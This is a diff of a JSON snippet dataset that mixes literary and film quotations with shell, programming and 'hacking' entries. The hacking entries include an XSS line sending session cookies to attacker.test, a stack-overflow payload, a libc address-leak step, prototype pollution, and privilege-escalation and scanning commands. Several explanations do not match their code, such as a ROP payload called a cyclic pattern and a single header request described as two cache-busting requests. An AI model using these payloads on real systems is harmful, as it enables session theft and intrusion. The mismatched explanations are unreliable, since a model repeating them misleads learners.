+    "content": "To Sherlock Holmes she is always the woman. I have seldom heard him mention her under any other name. In his eyes she eclipses and predominates the whole of her sex.",
+    "attribution": "Arthur Conan Doyle, A Scandal in Bohemia"
+  },
+  {
+    "category": "anime",
+    "content": "No matter how much I struggle, there's always a price to pay for changing the past.",
+    "attribution": "Steins;Gate"
+  },
+  {
+    "category": "anime",
+    "content": "When you look at someone's kindness, it's like looking at the sun.",
+    "attribution": "Fruits Basket"
+  },
+  {
+    "category": "programming",
+    "content": "counts = {word: text.count(word) for word in set(text.split())}",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "A dict comprehension. Note it is quadratic: count rescans the whole string per word. collections.Counter is the right tool."
+  },
+  {
+    "category": "philosophy",
+    "content": "All men by nature desire to know.",
+    "attribution": "Aristotle, Metaphysics"
+  },
+  {
+    "category": "history",
+    "content": "The strong do what they can and the weak suffer what they must.",
+    "attribution": "Thucydides, History of the Peloponnesian War"
+  },
+  {
+    "category": "quotes",
+    "content": "I went to the woods because I wished to live deliberately, to front only the essential facts of life, and see if I could not learn what it had to teach, and not, when I came to die, discover that I had not lived.",
+    "attribution": "Henry David Thoreau, Walden"
+  },
+  {
+    "category": "technology",
+    "content": "We are stuck with technology when what we really want is just stuff that works.",
+    "attribution": "Douglas Adams"
   },
   {
     "category": "sysadmin",
@@ -1869,45 +1053,47 @@
     "explanation": "What a process is actually waiting on. Reading its file descriptors and stack says more than another look at top."
   },
   {
-    "category": "general",
-    "content": "A group of flamingos is called a flamboyance. The birds get their pink color from the pigments in the shrimp and algae they eat."
+    "category": "business",
+    "content": "If you are not embarrassed by the first version of your product, you have launched too late.",
+    "attribution": "Reid Hoffman"
   },
   {
-    "category": "programming",
-    "content": "squares = [n * n for n in range(1, 21) if n % 3 != 0]",
-    "attribution": "Python",
+    "category": "hacking",
+    "content": "payload = b'A' * 72 + p64(0x401196) + p64(win_addr)",
+    "attribution": "Exploit dev",
     "language": "python",
-    "explanation": "A list comprehension: the expression, the loop, then the filter. Faster and clearer than appending in a for loop."
+    "explanation": "A cyclic pattern. Whatever four bytes end up in the instruction pointer tell you the exact offset to the return address."
   },
   {
-    "category": "nature",
-    "content": "Wilderness is not a luxury but a necessity of the human spirit.",
-    "attribution": "Edward Abbey, Desert Solitaire"
-  },
-  {
-    "category": "philosophy",
-    "content": "Every new beginning comes from some other beginning's end.",
-    "attribution": "Seneca, Letters from a Stoic"
+    "category": "anime",
+    "content": "Hard work is worthless for those that don't believe in themselves.",
+    "attribution": "Naruto"
   },
   {
     "category": "movies",
-    "content": "A census taker once tried to test me. I ate his liver with some fava beans and a nice chianti.",
-    "attribution": "The Silence of the Lambs (1991)"
+    "content": "I love the smell of napalm in the morning.",
+    "attribution": "Apocalypse Now (1979)"
   },
   {
-    "category": "nature",
-    "content": "There are some who can live without wild things, and some who cannot.",
-    "attribution": "Aldo Leopold, A Sand County Almanac"
+    "category": "programming",
+    "content": "git log -L 40,60:src/parser.rs --oneline",
+    "attribution": "Git",
+    "language": "shell",
+    "explanation": "Who last touched each line of a range, which is how you find the person to ask rather than the person to blame."
   },
   {
-    "category": "science",
-    "content": "A new scientific truth does not triumph by convincing its opponents, but rather because its opponents eventually die.",
-    "attribution": "Max Planck"
+    "category": "hacking",
+    "content": "curl -s https://target/app.js | grep -oE '\"/[a-zA-Z0-9_/-]+\"' | sort -u",
+    "attribution": "Recon",
+    "language": "shell",
+    "explanation": "Pulls every unique path a site references from its own JavaScript. Endpoints that no link points at are still endpoints."
   },
   {
-    "category": "science",
-    "content": "The first principle is that you must not fool yourself, and you are the easiest person to fool.",
-    "attribution": "Richard Feynman"
+    "category": "sysadmin",
+    "content": "chmod --reference=/etc/passwd /etc/passwd.new && chown --reference=/etc/passwd /etc/passwd.new",
+    "attribution": "Permissions",
+    "language": "shell",
+    "explanation": "Copies the ownership and mode of one file onto another, rather than typing the numbers and getting them wrong."
   },
   {
     "category": "programming",
@@ -1918,27 +1104,531 @@
   },
   {
     "category": "shell",
-    "content": "awk -F, 'NF != 3 {print NR\": \"$0}' data.csv",
-    "attribution": "awk",
+    "content": "sed -e 's/#.*//' -e '/^[[:space:]]*$/d' /etc/ssh/sshd_config",
+    "attribution": "sed",
     "language": "shell",
-    "explanation": "NR is the current line number, NF the field count. This finds malformed rows: any line that does not have exactly three fields."
+    "explanation": "Deletes comments and blank lines, which is how you read a config that is mostly documentation."
+  },
+  {
+    "category": "movies",
+    "content": "Of all the gin joints in all the towns in all the world, she walks into mine.",
+    "attribution": "Casablanca (1942)"
+  },
+  {
+    "category": "movies",
+    "content": "You're gonna need a bigger boat.",
+    "attribution": "Jaws (1975)"
   },
   {
     "category": "hacking",
-    "content": "find / -perm -4000 -type f 2>/dev/null",
-    "attribution": "Post-exploitation",
+    "content": "pacman -Qkk 2>&1 | grep -v ' 0 altered files'",
+    "attribution": "Defence",
     "language": "shell",
-    "explanation": "Finds setuid binaries. Anything unusual here runs as its owner no matter who executes it."
+    "explanation": "Compares installed files against the package manager's own checksums. A changed system binary shows up here."
+  },
+  {
+    "category": "technology",
+    "content": "Any sufficiently advanced technology is indistinguishable from magic.",
+    "attribution": "Arthur C. Clarke"
+  },
+  {
+    "category": "programming",
+    "content": "squares = [n * n for n in range(1, 21) if n % 3 != 0]",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "A list comprehension: the expression, the loop, then the filter. Faster and clearer than appending in a for loop."
+  },
+  {
+    "category": "shell",
+    "content": "sed -i 's/localhost/127.0.0.1/g' config.ini",
+    "attribution": "sed",
+    "language": "shell",
+    "explanation": "Substitute in place. The g flag replaces every match on a line, not just the first; -i writes the file rather than printing."
+  },
+  {
+    "category": "business",
+    "content": "Organisations design systems which are copies of the communication structures of those organisations.",
+    "attribution": "Conway's Law"
+  },
+  {
+    "category": "nature",
+    "content": "A thing is right when it tends to preserve the integrity, stability and beauty of the biotic community.",
+    "attribution": "Aldo Leopold, A Sand County Almanac"
+  },
+  {
+    "category": "nature",
+    "content": "When we try to pick out anything by itself, we find it hitched to everything else in the universe.",
+    "attribution": "John Muir, My First Summer in the Sierra"
+  },
+  {
+    "category": "general",
+    "content": "The human brain generates enough electricity to power a small light bulb. Billions of neurons firing electrical signals at once produce roughly the same wattage as a dim household lamp."
   },
   {
     "category": "anime",
-    "content": "You should enjoy the little detours to the fullest, because that's where you'll find the things more important than what you want.",
-    "attribution": "Hunter x Hunter"
+    "content": "This world is rotten, and those who are making it rot deserve to die.",
+    "attribution": "Death Note"
+  },
+  {
+    "category": "hacking",
+    "content": "curl -sI https://target/login | grep -i 'set-cookie' | grep -ci 'httponly.*secure'",
+    "attribution": "Web",
+    "language": "shell",
+    "explanation": "Checks whether a session cookie carries the flags that stop JavaScript reading it and stop it crossing sites."
+  },
+  {
+    "category": "literature",
+    "content": "Alice was beginning to get very tired of sitting by her sister on the bank, and of having nothing to do. Once or twice she had peeped into the book her sister was reading, but it had no pictures or conversations in it.",
+    "attribution": "Lewis Carroll, Alice's Adventures in Wonderland"
+  },
+  {
+    "category": "general",
+    "content": "The invention of the printing press in the fifteenth century transformed how knowledge spread across Europe. Books that once took months to copy by hand could suddenly be reproduced by the hundreds, making literacy far more accessible."
+  },
+  {
+    "category": "business",
+    "content": "Price is what you pay. Value is what you get.",
+    "attribution": "Warren Buffett"
   },
   {
     "category": "anime",
-    "content": "Trees and people used to be good friends.",
-    "attribution": "My Neighbor Totoro"
+    "content": "Once you've met someone, you never really forget them.",
+    "attribution": "Spirited Away"
+  },
+  {
+    "category": "technology",
+    "content": "The human mind operates by association. With one item in its grasp, it snaps instantly to the next that is suggested.",
+    "attribution": "Vannevar Bush, As We May Think"
+  },
+  {
+    "category": "hacking",
+    "content": "curl -s 'https://target/?x=1' -H 'X-Forwarded-Scheme: nothttps' -o /dev/null -w '%{http_code} %{time_total}\\n'",
+    "attribution": "Web",
+    "language": "shell",
+    "explanation": "Requests the same path twice with different cache-busting keys to see whether a proxy will serve one user's response to another."
+  },
+  {
+    "category": "shell",
+    "content": "sed -n '10,20p' large.log",
+    "attribution": "sed",
+    "language": "shell",
+    "explanation": "Prints only lines 10 to 20. -n suppresses the default print, and p prints the range that matched."
+  },
+  {
+    "category": "movies",
+    "content": "A census taker once tried to test me. I ate his liver with some fava beans and a nice chianti.",
+    "attribution": "The Silence of the Lambs (1991)"
+  },
+  {
+    "category": "hacking",
+    "content": "journalctl -u sshd -f | grep -Ei 'failed|invalid user'",
+    "attribution": "Defence",
+    "language": "shell",
+    "explanation": "Watches authentication failures as they happen. Most intrusions are visible in logs long before they are noticed."
+  },
+  {
+    "category": "nature",
+    "content": "Those who contemplate the beauty of the earth find reserves of strength that will endure as long as life lasts.",
+    "attribution": "Rachel Carson, The Sense of Wonder"
+  },
+  {
+    "category": "shell",
+    "content": "mount | column -t | grep -v tmpfs",
+    "attribution": "Text processing",
+    "language": "shell",
+    "explanation": "column formats whitespace-separated input into aligned columns, which makes an unreadable log readable."
+  },
+  {
+    "category": "philosophy",
+    "content": "The only true wisdom is in knowing you know nothing.",
+    "attribution": "Socrates"
+  },
+  {
+    "category": "sysadmin",
+    "content": "ps -eo pid,user,rss,pcpu,comm --sort=-rss | head -12",
+    "attribution": "Processes",
+    "language": "shell",
+    "explanation": "The heaviest processes by resident memory. --sort takes a minus for descending order."
+  },
+  {
+    "category": "history",
+    "content": "Those who cannot remember the past are condemned to repeat it.",
+    "attribution": "George Santayana, The Life of Reason"
+  },
+  {
+    "category": "history",
+    "content": "We must always take sides. Neutrality helps the oppressor, never the victim. Silence encourages the tormentor.",
+    "attribution": "Elie Wiesel, 1986"
+  },
+  {
+    "category": "hacking",
+    "content": "JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')",
+    "attribution": "Web",
+    "language": "javascript",
+    "explanation": "Prototype pollution: writing through __proto__ reaches every object that inherits from it."
+  },
+  {
+    "category": "technology",
+    "content": "We have modified our environment so radically that we must now modify ourselves to exist in this new environment.",
+    "attribution": "Norbert Wiener"
+  },
+  {
+    "category": "anime",
+    "content": "Whatever happens, happens.",
+    "attribution": "Cowboy Bebop"
+  },
+  {
+    "category": "hacking",
+    "content": "curl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq -r '.[].name_value' | sort -u",
+    "attribution": "Recon",
+    "language": "shell",
+    "explanation": "Certificate transparency logs list every name a CA has issued for a domain, including hosts that were never meant to be public."
+  },
+  {
+    "category": "history",
+    "content": "I could work as much and eat as much as a man, when I could get it, and bear the lash as well. And ain't I a woman?",
+    "attribution": "Sojourner Truth, 1851"
+  },
+  {
+    "category": "history",
+    "content": "We shall fight on the beaches, we shall fight on the landing grounds, we shall fight in the fields and in the streets.",
+    "attribution": "Winston Churchill, 1940"
+  },
+  {
+    "category": "literature",
+    "content": "It was on a dreary night of November that I beheld the accomplishment of my toils. With an anxiety that almost amounted to agony, I collected the instruments of life around me, that I might infuse a spark of being into the lifeless thing that lay at my feet.",
+    "attribution": "Mary Shelley, Frankenstein"
+  },
+  {
+    "category": "programming",
+    "content": "groups = defaultdict(list); [groups[w[0]].append(w) for w in words]",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "defaultdict removes the exists-check before every append, which is the most common shape of a grouping loop."
+  },
+  {
+    "category": "science",
+    "content": "The good thing about science is that it's true whether or not you believe in it.",
+    "attribution": "Neil deGrasse Tyson"
+  },
+  {
+    "category": "movies",
+    "content": "We used to look up at the sky and wonder at our place in the stars. Now we just look down and worry about our place in the dirt.",
+    "attribution": "Interstellar (2014)"
+  },
+  {
+    "category": "science",
+    "content": "The Analytical Engine weaves algebraical patterns just as the Jacquard loom weaves flowers and leaves.",
+    "attribution": "Ada Lovelace"
+  },
+  {
+    "category": "anime",
+    "content": "The only thing we're allowed to do is to believe that we won't regret the choice we made.",
+    "attribution": "Attack on Titan"
+  },
+  {
+    "category": "hacking",
+    "content": "free(ptr); ptr->next = head; /* use after free: the block may belong to someone else now */",
+    "attribution": "Memory safety",
+    "language": "clike",
+    "explanation": "Freed then used. The allocator may hand that block to something else between the two lines, so the write lands in another object."
+  },
+  {
+    "category": "philosophy",
+    "content": "Utilitarianism holds that the right action is the one that produces the greatest good for the greatest number of people, judging morality by outcomes rather than intentions."
+  },
+  {
+    "category": "nature",
+    "content": "No one will protect what they don't care about, and no one will care about what they have never experienced.",
+    "attribution": "David Attenborough"
+  },
+  {
+    "category": "programming",
+    "content": "for f in *.log; do gzip -9 \"$f\" && echo \"packed $f\"; done",
+    "attribution": "Shell",
+    "language": "shell",
+    "explanation": "The quotes around $f matter: without them a filename containing a space becomes two arguments."
+  },
+  {
+    "category": "sysadmin",
+    "content": "lsof +L1 2>/dev/null | awk '$7 > 100000000 {print $1, $7, $NF}'",
+    "attribution": "Disk",
+    "language": "shell",
+    "explanation": "Finds space held by deleted files that a process still has open. Deleting the file does not free the space until the handle closes."
+  },
+  {
+    "category": "shell",
+    "content": "tr -cs '[:alpha:]' '\\n' < book.txt | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -20",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "The classic word-frequency pipeline: split to one word per line, fold case, sort so duplicates are adjacent, count runs, order by count."
+  },
+  {
+    "category": "quotes",
+    "content": "If there is no struggle, there is no progress. Those who profess to favor freedom, and yet depreciate agitation, are men who want crops without plowing up the ground.",
+    "attribution": "Frederick Douglass"
+  },
+  {
+    "category": "anime",
+    "content": "What I want more than anything is for you to live and help me live too.",
+    "attribution": "A Silent Voice"
+  },
+  {
+    "category": "science",
+    "content": "In the fields of observation chance favours only the prepared mind.",
+    "attribution": "Louis Pasteur"
+  },
+  {
+    "category": "quotes",
+    "content": "The only limit to our realization of tomorrow is our doubts of today.",
+    "attribution": "Franklin D. Roosevelt"
+  },
+  {
+    "category": "history",
+    "content": "The only thing we have to fear is fear itself: nameless, unreasoning, unjustified terror.",
+    "attribution": "Franklin D. Roosevelt, 1933"
+  },
+  {
+    "category": "science",
+    "content": "The great tragedy of science: the slaying of a beautiful hypothesis by an ugly fact.",
+    "attribution": "Thomas Huxley"
+  },
+  {
+    "category": "sysadmin",
+    "content": "systemctl --failed --no-pager",
+    "attribution": "systemd",
+    "language": "shell",
+    "explanation": "Lists units that failed at boot. The first thing to run on a machine that came up wrong."
+  },
+  {
+    "category": "shell",
+    "content": "tmp=$(mktemp -d) && trap 'rm -rf \"$tmp\"' EXIT",
+    "attribution": "Shell safety",
+    "language": "shell",
+    "explanation": "A trap on EXIT cleans up whether the script succeeded, failed or was interrupted."
+  },
+  {
+    "category": "business",
+    "content": "A wealth of information creates a poverty of attention.",
+    "attribution": "Herbert Simon"
+  },
+  {
+    "category": "shell",
+    "content": "set -euo pipefail",
+    "attribution": "Shell safety",
+    "language": "shell",
+    "explanation": "The unofficial strict mode: exit on error, exit on undefined variable, and fail a pipeline if any stage fails rather than only the last."
+  },
+  {
+    "category": "nature",
+    "content": "The earth is what we all have in common.",
+    "attribution": "Wendell Berry"
+  },
+  {
+    "category": "shell",
+    "content": "grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' access.log | sort -u | wc -l",
+    "attribution": "Text processing",
+    "language": "shell",
+    "explanation": "grep -o prints only the match, one per line, which turns a search into a stream you can count."
+  },
+  {
+    "category": "literature",
+    "content": "The studio was filled with the rich odour of roses, and when the light summer wind stirred amidst the trees of the garden, there came through the open door the heavy scent of the lilac, or the more delicate perfume of the pink-flowering thorn.",
+    "attribution": "Oscar Wilde, The Picture of Dorian Gray"
+  },
+  {
+    "category": "movies",
+    "content": "Do. Or do not. There is no try.",
+    "attribution": "The Empire Strikes Back (1980)"
+  },
+  {
+    "category": "literature",
+    "content": "It is a truth universally acknowledged, that a single man in possession of a good fortune, must be in want of a wife. However little known the feelings or views of such a man may be on his first entering a neighbourhood, this truth is so well fixed in the minds of the surrounding families.",
+    "attribution": "Jane Austen, Pride and Prejudice"
+  },
+  {
+    "category": "sysadmin",
+    "content": "strace -c -f -p $PID 2>&1 | tail -20",
+    "attribution": "Processes",
+    "language": "shell",
+    "explanation": "Traces the system calls a command makes, with a count and timing summary rather than a wall of output."
+  },
+  {
+    "category": "hacking",
+    "content": "iptables -P INPUT DROP && iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT",
+    "attribution": "Defence",
+    "language": "shell",
+    "explanation": "Blocks everything inbound by default and allows what is needed back. A deny-by-default policy is the only kind worth writing."
+  },
+  {
+    "category": "technology",
+    "content": "Plan to throw one away; you will, anyhow.",
+    "attribution": "Fred Brooks, The Mythical Man-Month"
+  },
+  {
+    "category": "technology",
+    "content": "We shape our tools, and thereafter our tools shape us.",
+    "attribution": "Marshall McLuhan"
+  },
+  {
+    "category": "shell",
+    "content": "cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "uniq only collapses adjacent duplicates, which is why sort comes first. -c counts, and the second sort orders by that count."
+  },
+  {
+    "category": "science",
+    "content": "There is grandeur in this view of life, with its several powers, having been originally breathed into a few forms or into one.",
+    "attribution": "Charles Darwin, On the Origin of Species"
+  },
+  {
+    "category": "quotes",
+    "content": "To be great is to be misunderstood.",
+    "attribution": "Ralph Waldo Emerson, Self-Reliance"
+  },
+  {
+    "category": "shell",
+    "content": "comm -13 <(sort old.txt) <(sort new.txt)",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "comm compares two sorted files by column: -13 shows only lines unique to the second, which is the set that was added."
+  },
+  {
+    "category": "business",
+    "content": "Every moment in business happens only once. The next Bill Gates will not build an operating system.",
+    "attribution": "Peter Thiel, Zero to One"
+  },
+  {
+    "category": "business",
+    "content": "The real price of everything is the toil and trouble of acquiring it.",
+    "attribution": "Adam Smith, The Wealth of Nations"
+  },
+  {
+    "category": "movies",
+    "content": "Louis, I think this is the beginning of a beautiful friendship.",
+    "attribution": "Casablanca (1942)"
+  },
+  {
+    "category": "nature",
+    "content": "Nature is not a place to visit. It is home.",
+    "attribution": "Gary Snyder"
+  },
+  {
+    "category": "hacking",
+    "content": "fetch('//attacker.test/?c=' + encodeURIComponent(document.cookie))",
+    "attribution": "Web",
+    "language": "javascript",
+    "explanation": "A stored XSS payload that steals a session. HttpOnly on the cookie is what stops this line reading it."
+  },
+  {
+    "category": "history",
+    "content": "Four score and seven years ago our fathers brought forth on this continent a new nation, conceived in liberty.",
+    "attribution": "Abraham Lincoln, Gettysburg Address, 1863"
+  },
+  {
+    "category": "sysadmin",
+    "content": "ssh -N -L 5432:127.0.0.1:5432 dbhost",
+    "attribution": "SSH",
+    "language": "shell",
+    "explanation": "Forwards a remote port to the local machine, so a service bound to localhost on the server is reachable here."
+  },
+  {
+    "category": "nature",
+    "content": "Tell me, what is it you plan to do with your one wild and precious life?",
+    "attribution": "Mary Oliver"
+  },
+  {
+    "category": "hacking",
+    "content": "libc.address = leak - libc.symbols['puts']",
+    "attribution": "Exploit dev",
+    "language": "python",
+    "explanation": "Leaks a libc address from the GOT, then rebases every other libc symbol off it. This is how ASLR is worked around rather than defeated."
+  },
+  {
+    "category": "movies",
+    "content": "Toto, I've a feeling we're not in Kansas anymore.",
+    "attribution": "The Wizard of Oz (1939)"
+  },
+  {
+    "category": "programming",
+    "content": "try: value = int(raw) except ValueError: value = 0",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "Catching the specific exception, not a bare except - a bare one would also swallow KeyboardInterrupt."
+  },
+  {
+    "category": "literature",
+    "content": "All we have to decide is what to do with the time that is given us.",
+    "attribution": "J.R.R. Tolkien, The Fellowship of the Ring"
+  },
+  {
+    "category": "technology",
+    "content": "A distributed system is one in which the failure of a computer you didn't know existed can render your own computer unusable.",
+    "attribution": "Leslie Lamport"
+  },
+  {
+    "category": "history",
+    "content": "Power concedes nothing without a demand. It never did and it never will.",
+    "attribution": "Frederick Douglass, 1857"
+  },
+  {
+    "category": "shell",
+    "content": "awk '!seen[$0]++' file.txt",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "Deduplicate without sorting, preserving original order. The array records what has been seen; !seen[$0]++ is true only the first time."
+  },
+  {
+    "category": "philosophy",
+    "content": "It's not what happens to you, but how you react to it that matters.",
+    "attribution": "Epictetus"
+  },
+  {
+    "category": "movies",
+    "content": "There's no crying in baseball.",
+    "attribution": "A League of Their Own (1992)"
+  },
+  {
+    "category": "shell",
+    "content": "awk '$9 == 404 {print $7}' access.log | sort | uniq -c | sort -rn",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "A pattern before the block acts as a filter: only lines whose 9th field is 404 are printed. No grep needed."
+  },
+  {
+    "category": "nature",
+    "content": "There are some who can live without wild things, and some who cannot.",
+    "attribution": "Aldo Leopold, A Sand County Almanac"
+  },
+  {
+    "category": "programming",
+    "content": "for i, v := range items { fmt.Printf(\"%d: %v\\n\", i, v) }",
+    "attribution": "Go",
+    "language": "clike",
+    "explanation": "range yields index and value. In Go before 1.22 the loop variable was reused each iteration, which surprised anyone capturing it in a closure."
+  },
+  {
+    "category": "business",
+    "content": "It is not from the benevolence of the butcher, the brewer, or the baker that we expect our dinner, but from their regard to their own interest.",
+    "attribution": "Adam Smith, The Wealth of Nations"
+  },
+  {
+    "category": "literature",
+    "content": "1801. I have just returned from a visit to my landlord, the solitary neighbour that I shall be troubled with. This is certainly a beautiful country. In all England, I do not believe that I could have fixed on a situation so completely removed from the stir of society.",
+    "attribution": "Emily Bronte, Wuthering Heights"
+  },
+  {
+    "category": "hacking",
+    "content": "nmap -sS -sV -T4 --top-ports 1000 10.0.0.0/24",
+    "attribution": "Recon",
+    "language": "shell",
+    "explanation": "A TCP SYN scan of the top 1000 ports. -sV asks each open port for its service banner, which is what turns a port list into a target list."
+  },
+  {
+    "category": "technology",
+    "content": "Technology is neither good nor bad; nor is it neutral.",
+    "attribution": "Melvin Kranzberg"
   },
   {
     "category": "movies",
@@ -1946,8 +1636,323 @@
     "attribution": "The Dark Knight (2008)"
   },
   {
+    "category": "literature",
+    "content": "You don't know about me without you have read a book by the name of The Adventures of Tom Sawyer, but that ain't no matter. That book was made by Mr. Mark Twain, and he told the truth, mainly.",
+    "attribution": "Mark Twain, Adventures of Huckleberry Finn"
+  },
+  {
+    "category": "shell",
+    "content": "awk '{bytes[$1] += $10} END {for (ip in bytes) print bytes[ip], ip}' access.log | sort -rn | head",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "Associative arrays are awk's real power. This sums bytes per IP in one pass, then END prints the totals once input is exhausted."
+  },
+  {
+    "category": "science",
+    "content": "Extraordinary claims require extraordinary evidence.",
+    "attribution": "Carl Sagan, The Demon-Haunted World"
+  },
+  {
+    "category": "science",
+    "content": "Science and everyday life cannot and should not be separated.",
+    "attribution": "Rosalind Franklin"
+  },
+  {
+    "category": "anime",
+    "content": "A heart's a heavy burden.",
+    "attribution": "Howl's Moving Castle"
+  },
+  {
+    "category": "nature",
+    "content": "The earth does not belong to us. We belong to the earth.",
+    "attribution": "Chief Seattle"
+  },
+  {
+    "category": "philosophy",
+    "content": "Waste no more time arguing about what a good man should be. Be one.",
+    "attribution": "Marcus Aurelius, Meditations"
+  },
+  {
+    "category": "history",
+    "content": "We choose to go to the moon in this decade and do the other things, not because they are easy, but because they are hard.",
+    "attribution": "John F. Kennedy, 1962"
+  },
+  {
+    "category": "programming",
+    "content": "with open('data.csv', encoding='utf-8') as f: rows = [line.split(',') for line in f]",
+    "attribution": "Python",
+    "language": "python",
+    "explanation": "with closes the file even if the body raises. Iterating a file yields lines without loading it all into memory."
+  },
+  {
+    "category": "programming",
+    "content": "pub struct Point { pub x: f64, pub y: f64 }",
+    "attribution": "Rust",
+    "language": "rust",
+    "explanation": "Fields are private by default in Rust, so each one needs its own pub - making the struct public does not publish its contents."
+  },
+  {
+    "category": "anime",
+    "content": "Humankind cannot gain anything without first giving something in return. To obtain, something of equal value must be lost.",
+    "attribution": "Fullmetal Alchemist"
+  },
+  {
+    "category": "general",
+    "content": "Bananas are botanically classified as berries, while strawberries are not. The classification depends on how the fruit develops from the flower, not on taste or size."
+  },
+  {
+    "category": "quotes",
+    "content": "The best way out is always through, and the only way through is to begin where you are standing right now.",
+    "attribution": "Robert Frost"
+  },
+  {
+    "category": "literature",
+    "content": "Not all those who wander are lost.",
+    "attribution": "J.R.R. Tolkien"
+  },
+  {
     "category": "technology",
-    "content": "The web as I envisaged it, we have not seen it yet. The future is still so much bigger than the past.",
-    "attribution": "Tim Berners-Lee"
+    "content": "You can't trust code that you did not totally create yourself.",
+    "attribution": "Ken Thompson, Reflections on Trusting Trust"
+  },
+  {
+    "category": "quotes",
+    "content": "Whatever you are, be a good one.",
+    "attribution": "Abraham Lincoln"
+  },
+  {
+    "category": "programming",
+    "content": "git reflog --date=iso | head -20",
+    "attribution": "Git",
+    "language": "shell",
+    "explanation": "Recovers commits that are no longer reachable from any branch. A hard reset does not destroy them; it just stops pointing at them."
+  },
+  {
+    "category": "business",
+    "content": "The essence of strategy is choosing what not to do.",
+    "attribution": "Michael Porter"
+  },
+  {
+    "category": "business",
+    "content": "The purpose of business is to create and keep a customer.",
+    "attribution": "Peter Drucker"
+  },
+  {
+    "category": "hacking",
+    "content": "printf(user_input); /* format string bug - should be printf(\"%s\", user_input) */",
+    "attribution": "Memory safety",
+    "language": "clike",
+    "explanation": "An attacker-controlled format string. Every %x walks the stack; %n writes to it."
+  },
+  {
+    "category": "business",
+    "content": "It takes twenty years to build a reputation and five minutes to ruin it.",
+    "attribution": "Warren Buffett"
+  },
+  {
+    "category": "general",
+    "content": "The quick brown fox jumps over the lazy dog."
+  },
+  {
+    "category": "technology",
+    "content": "Talk is cheap. Show me the code.",
+    "attribution": "Linus Torvalds"
+  },
+  {
+    "category": "sysadmin",
+    "content": "tar czf - /var/www | ssh backup 'cat > www-$(date +%F).tar.gz'",
+    "attribution": "Backup",
+    "language": "shell",
+    "explanation": "Streams a directory to another host without a temporary archive on either side."
+  },
+  {
+    "category": "anime",
+    "content": "Don't believe in yourself. Believe in me who believes in you.",
+    "attribution": "Gurren Lagann"
+  },
+  {
+    "category": "shell",
+    "content": "ls *.png | xargs -P4 -I{} convert {} -resize 50% small/{}",
+    "attribution": "Pipelines",
+    "language": "shell",
+    "explanation": "Runs a command per input line in parallel. -P4 keeps four running at once, and -I{} places each name where the braces are."
+  },
+  {
+    "category": "business",
+    "content": "Disruptive technologies typically enable new markets to emerge, and they underperform established products in mainstream markets.",
+    "attribution": "Clayton Christensen, The Innovator's Dilemma"
+  },
+  {
+    "category": "sysadmin",
+    "content": "systemd-analyze blame | head -15",
+    "attribution": "systemd",
+    "language": "shell",
+    "explanation": "Ranks services by how long they delayed boot. The usual answer to a slow start is one unit near the top."
+  },
+  {
+    "category": "movies",
+    "content": "With great power comes great responsibility.",
+    "attribution": "Spider-Man (2002)"
+  },
+  {
+    "category": "programming",
+    "content": "for (int i = 0; i < n; i++) { sum += a[i] * b[i]; }",
+    "attribution": "C",
+    "language": "clike",
+    "explanation": "A dot product. The bound is < n, not <= n; off-by-one here reads past the end of the array."
+  },
+  {
+    "category": "literature",
+    "content": "Buck did not read the newspapers, or he would have known that trouble was brewing, not alone for himself, but for every tide-water dog, strong of muscle and with warm, long hair, from Puget Sound to San Diego.",
+    "attribution": "Jack London, The Call of the Wild"
+  },
+  {
+    "category": "hacking",
+    "content": "if not hmac.compare_digest(expected_sig, provided_sig): raise ValueError('bad signature')",
+    "attribution": "Defence",
+    "language": "python",
+    "explanation": "Constant-time comparison. A plain == returns early on the first differing byte, which leaks the answer through timing."
+  },
+  {
+    "category": "shell",
+    "content": "cut -f2 data.tsv | paste -sd, -",
+    "attribution": "Text processing",
+    "language": "shell",
+    "explanation": "paste joins lines side by side; -s -d joins them all into one line with the chosen separator."
+  },
+  {
+    "category": "programming",
+    "content": "int *buf = malloc(len * sizeof(int)); if (!buf) return -1;",
+    "attribution": "C",
+    "language": "clike",
+    "explanation": "malloc returns NULL when it fails, and checking is not optional. sizeof(int) rather than 4 keeps it correct across platforms."
+  },
+  {
+    "category": "literature",
+    "content": "The Nellie, a cruising yawl, swung to her anchor without a flutter of the sails, and was at rest. The flood had made, the wind was nearly calm, and being bound down the river, the only thing for it was to come to and wait for the turn of the tide.",
+    "attribution": "Joseph Conrad, Heart of Darkness"
+  },
+  {
+    "category": "nature",
+    "content": "The land is one great wild, untidy, luxuriant hothouse, made by nature for herself.",
+    "attribution": "Charles Darwin, The Voyage of the Beagle"
+  },
+  {
+    "category": "business",
+    "content": "In God we trust; all others must bring data.",
+    "attribution": "W. Edwards Deming"
+  },
+  {
+    "category": "shell",
+    "content": "awk '{print $1, $NF}' access.log",
+    "attribution": "awk",
+    "language": "shell",
+    "explanation": "awk splits each line into fields on whitespace. $1 is the first, $NF the last - so this prints the first and last column of every line."
+  },
+  {
+    "category": "science",
+    "content": "The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.",
+    "attribution": "Stephen Hawking"
+  },
+  {
+    "category": "hacking",
+    "content": "sudo -l 2>/dev/null | grep -E 'NOPASSWD|\\(ALL\\)'",
+    "attribution": "Post-exploitation",
+    "language": "shell",
+    "explanation": "Lists what the current user may run as root. A single entry with NOPASSWD is often the whole path to root."
+  },
+  {
+    "category": "quotes",
+    "content": "If I have seen further, it is by standing on the shoulders of giants.",
+    "attribution": "Isaac Newton"
+  },
+  {
+    "category": "sysadmin",
+    "content": "tcpdump -ni any 'tcp[tcpflags] & tcp-syn != 0' -c 20",
+    "attribution": "Network",
+    "language": "shell",
+    "explanation": "Captures the start of connections only. -n skips DNS lookups, which otherwise generate the traffic you are trying to read."
+  },
+  {
+    "category": "movies",
+    "content": "If you build it, he will come.",
+    "attribution": "Field of Dreams (1989)"
+  },
+  {
+    "category": "sysadmin",
